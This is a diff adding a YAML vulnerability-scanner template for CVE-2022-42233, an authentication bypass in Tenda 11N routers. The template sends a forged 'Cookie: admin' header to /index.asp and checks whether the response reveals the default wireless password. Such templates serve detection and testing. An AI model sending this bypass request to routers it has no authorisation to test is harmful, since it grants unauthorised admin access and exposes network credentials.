@@ -1,0 +1,31 @@
+id: cve-2022-42233-tenda-auth-bypass
+
+info:
+  name: Tenda Authentication Bypass Vulnerability (CVE-2022-42233)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: cve, authentication-bypass
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.asp"
+    headers:
+      Cookie: admin
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "def_wirelesspassword"
+      - type: word
+        part: body
+        words:
+          - "Tenda 11N"
+      - type: word
+        part: header
+        words:
+          - "GoAhead-Webs"
